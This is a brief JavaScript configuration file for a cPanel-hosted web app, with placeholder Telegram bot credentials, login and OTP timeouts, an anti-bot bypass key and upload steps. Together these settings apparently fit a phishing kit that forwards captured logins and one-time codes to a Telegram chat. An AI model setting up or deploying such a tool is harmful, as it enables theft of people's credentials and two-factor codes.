// Configuration for static hosting (cPanel, etc.)
// Replace the values below with your actual credentials before uploading

window.ENV = {
  // Get your bot token from @BotFather on Telegram
  TELEGRAM_BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",

  // Your Telegram chat ID (can be your user ID or group ID)
  TELEGRAM_CHAT_ID: "YOUR_CHAT_ID_HERE",

  // Timeout settings (in milliseconds)
  LOGIN_TIMEOUT_MS: "1500",
  OTP_TIMEOUT_MS: "1500",

  // Anti-bot settings
  ANTIBOT_WHITELIST_KEY: "ALLOW_TESTING_ACCESS_2024",
};

// Instructions:
// 1. Replace YOUR_BOT_TOKEN_HERE with your actual Telegram bot token
// 2. Replace YOUR_CHAT_ID_HERE with your actual Telegram chat ID
// 3. Upload this file to your cPanel public_html folder
// 4. The app will automatically use these values
